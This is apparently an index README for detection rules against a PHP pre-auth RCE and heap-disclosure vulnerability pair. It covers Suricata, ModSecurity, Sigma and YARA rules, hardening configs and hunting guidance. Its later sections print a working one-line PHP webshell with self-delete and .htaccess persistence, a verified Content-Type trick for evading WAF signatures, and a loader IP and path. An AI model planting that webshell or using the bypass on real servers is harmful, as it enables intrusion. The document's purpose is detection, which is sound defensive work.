# php2shell detections v2 — index

**CVE-2026-109618 / CVE-2026-109619** · PHP pre-auth RCE + memory disclosure · patched 2026-10-21 14:00 UTC

This directory **extends** `../handoff/extracted/php2shell-research/detections/` (v1)
and adds coverage that emerged from (a) the official 21-Oct disclosure and (b) a
live validation lab. Nothing here duplicates v1 rule IDs.

## What's here

| File | Layer | Covers |
|---|---|---|
| `DETECTION-MEMORY-DISCLOSURE.md` | mixed | **NEW — silent heap exfiltration via `PHPSESSID` response cookie.** Not covered by v1 or any of the other v2 files. Includes Suricata/ModSecurity/Sigma + the producer→consumer→leak correlation. |
| `suricata/php2shell-v2.rules` | network | **14 rules, SIDs 2202610100–113.** OOM shapes 1–3 (0100/0101 chunked-no-CL, 0102/0103 part-header flood, 0104/0105 `filename=""`+nesting), multipart on PUT/PATCH/DELETE (0106), giant filenames ≥64 KB / ≥1 MB (0107/0108, flowint arm tracking), `s[]`/`t[]` spray (0109), multipart to `.php` under `uploads/` (0110) and directly under `wp-content/` (0113), arm-stage 500 receipt (0111), fire-stage follow-up (0112, heuristic). **Note:** v1 SIDs 0006–0009 already covered OOM shapes 1–3; these are different-anchor/different-threshold variants, not wholly new coverage — see per-rule overlap notes inline |
| `zeek/php2shell.zeek` | network | Multipart part counting, `PHP_SESSION_UPLOAD_PROGRESS` + `PHPSESSID` form-field pairing, **mid-body 1–2 s inter-chunk stall measurement** (the `min_freq` timing arm) |
| `modsecurity/php2shell-v2.conf` | WAF | IDs 2026106201–207: OOM shapes 1–3 (chunked-multipart-no-Content-Length, part-header flood, deep nesting, giant filename), non-POST multipart, session fixation; **211–215 = detect-only canaries**. Validated on libmodsecurity 3.0.17: all enforcement rules returned 403 on crafted bodies, benign multipart passed. **Note:** canaries use `phase:5` (LOGGING), not `phase:4` — phase 4 is RESPONSE_BODY and is skipped when `SecResponseBodyAccess` is Off (the default), so phase-4 canaries would never execute. **Response-side heap-leak rules live in `DETECTION-MEMORY-DISCLOSURE.md`**, not here, because they need response-header inspection enabled. |
| `config/hardening/` | host | **Three deployable snippets, functionally validated:** `apache-modphp-hardening.conf` (mod_php = highest-risk SAPI) · `fpm-pool-hardening.conf` (pool-scoped fragment) · `nginx-frontend-hardening.conf` (maps, 403 brakes, FastCGI `PHP_VALUE`/`PHP_ADMIN_VALUE` stripping). All pass `apachectl configtest` / `php-fpm -t` / `nginx -t`. Advisory mitigations only — not a patch substitute. |
| `sigma/web_php_fatal_corruption_sequence.yml` | web logs | **Lab-validated exact strings**: pre-RINIT OOM, stale-session INI warning, `zend_mm_heap corrupted`, dangling `PS(save_path)` (path embedding old log text), `session_encode(): Cannot encode non-existent session`, plus **producer/consumer and same-worker correlation rules** |
| `sigma/lnx_php2shell_worker_anomaly.yml` | Linux host | Zombie worker pile-up, `/proc/<pid>/mem` read-back, session-file writes by pool user, non-pool writes to save_path, flock-while-processing |
| `sigma/win_php2shell_exploit_host_indicators.yml` | Windows host | php.exe → recon/log-clear/scheduled-task/Run-key/download-cradle |
| `yara/php2shell.yar` | files | Exploit tooling on disk (skeleton, jackalsyn bundle, Calif artifacts) + **weaponised session files** (PHP tags / `|O:` / `R:` inside `sess_*`) |
| `hunting/hunting-queries-v2.md` | hunting | Splunk/Elastic/Defender/KQL/auditd/grep: producer→consumer joins, cookie-leak hunt, OOM-shape hunts, scanner detection, patch inventory, post-exploitation scoping |

## Coverage matrix

| Attack mode | v1 | v2 |
|---|---|---|
| RCE via OOM corruption (mod_php) | partial | ✅ all 3 official shapes |
| RCE via FPM app-level stale decode | ✗ | ◐ producer/consumer correlation |
| Session-file injection → LFI (Chain A) | ✅ | ✅ + YARA on session files |
| `var_destroy` UAF (Chain B) | ✗ | ◐ tooling YARA + hunting |
| Handler mismatch → `__destruct` (Chain C) | ✅ | ✅ |
| **Silent heap disclosure (no RCE)** | **✗** | ✅ **DETECTION-MEMORY-DISCLOSURE.md** |
| OPcache cross-worker type confusion | ✗ | hunting only (no reliable wire signal) |
| Scan/probe tooling (`php2shell.site`) | ✗ | ✅ hunting §4 |
| Patch-state inventory | ✗ | ✅ hunting §5 |

Legend: ✅ covered · ◐ partial · ✗ not covered

## Deploy order (suggested)

1. **Suricata + Zeek** — cheapest, catches scanning and arm stages immediately.
2. **ModSecurity OOM-shape rules in `pass,log`** → promote after baseline.
3. **Sigma web-log producer/consumer correlation** — highest value for detecting actual RCE attempts.
4. **`DETECTION-MEMORY-DISCLOSURE.md` cookie rules in `pass,log`** — near-zero FP, promote to `deny` on first hit.
5. **YARA** — scan session dirs and web roots for weaponised `sess_*` and dropped tooling.
6. **Hunting §5** — build the unpatched-host inventory; that drives your patch queue.

## Notes and caveats

- Every quoted log string in the Sigma/hunting files was captured **verbatim in the
  validation lab** — see `../lab/VALIDATION-REPORT.md` and `../lab26/LEAK-BOUNDARY-ANALYSIS.md`.
- The **`PHPSESSID` cookie discriminator is character-set/length, never the name** —
  legitimate apps use that cookie name universally. A real PHP session id is 26 chars
  from `[A-Za-z0-9,-]` and is never percent-encoded.
- **Session-file YARA rules need filename awareness** (YARA can't see paths); deploy with
  `yara -r -g` over session dirs or wrap in a scanner that pre-filters `sess_*`.
- The OPcache variant leaves no per-request wire signature; treat as hunting only. The
  patch fixes all variants, which is why patch speed dominates tuning.
- EOL PHP (≤8.1) will never get an upstream fix; PHP published minimal source backports
  for 7.4/8.0/8.1 branches, so distro/vendor backports are the only route.

## Sources
Calif `calif.io/php2shell.x/` · Wiz `wiz.io/blog/php2shell-php-rce` · php.net advisory
`php.net/archive/2026.php#2026-10-21-5` · GHSA-w8hw-w9fx-j79w · GHSA-6wmf-4rv5-p3rp ·
`php2shell.com` · vendor detections from Cloudflare, Corelight, CrowdStrike, Unit 42,
Cisco Talos, Imperva, Akamai.

### 2026-10-24 addition — public exploit artefacts (SIDs 2202610116/117, YARA PHP2Shell_Joas_Webshell_105B)

A public exploit framework (`JoasASantos/php2shell-exploit`) was reproduced by us on 2026-10-24
(single-worker Apache prefork, `display_errors=Off`). Its artefacts are nameable:

| Artefact | Value |
|---|---|
| Webshell paths | `/.p2s.php`, `/assets/.p2s.php`, `/tmp/.p2s.php`; v2: `/tmp/.p2s_v2.php` |
| Execution | `GET /.p2s.php?c=<command>` |
| Self-delete | `GET /.p2s.php?rm=1` → prints `removed` |
| Webshell body (105 bytes) | `<?php if(isset($_GET["c"])){system($_GET["c"]);}if(isset($_GET["rm"])){unlink(__FILE__);echo"removed";}?>` |
| v2 persistence | `.htaccess` containing `php_value auto_prepend_file "/tmp/.p2s_v2.php"` |

The `*.p2s.php` URI rule is high-fidelity and low-noise; the response-body rule catches the shell
being served; the YARA rule catches the file on disk even if renamed (3-of-4 string condition).

### 2026-10-25 — Content-Type bypass for WAF signatures (verified)

PHP trims the `Content-Type` value at `;`, `,` **and space**, so a request with

```
Content-Type: multipart/form-data, boundary=X
```

is processed as a normal multipart upload. Any WAF signature anchored on the common
`multipart/form-data;` form therefore misses it.

**Verified by us** on `php:8.4.26-apache`: the body parsed identically under both forms.

**Our rules are not affected** — all Suricata rules match the substring
`Content-Type: multipart/form-data` without requiring the semicolon, and the ModSecurity rule uses
`@rx (?i)^multipart/form-data`. If you copy signatures from elsewhere, check the anchoring.

Source: `dinosn/php-cve-2026-10961x-lab-poc` research write-up (claim independently reproduced here).

### 2026-10-25 — Campaign IoCs from CYFIRMA (3 new Suricata rules, 18 → 21)

Provenance: CYFIRMA advisory v3 (24 Oct), section 09. Full IoC set with caveats in
`04-hunting/cyfirma-iocs-2026-10-25.md`.

| SID | Rule | Why it survives IOC rotation |
|---|---|---|
| 2202610118 | Request `User-Agent` contains `php2shell-` (scanner family) | tool naming, not infrastructure |
| 2202610119 | Response body contains `JACKALPOC` | blind-RCE canary — **hit means code executed** |
| 2202610120 | Egress to `92.118.112.100` URI `/nfs` (Mirai-style loader) | payload delivery path |

Validated: Suricata 8.0.7 `-T` exits 0. The IP lists in the hunting doc are ephemeral and partly
shared/anonymising infrastructure — hunt and pivot with them, do not treat them as a security control.
A `php2shell-` user-agent can also be a researcher's scanner; correlate with request shape.
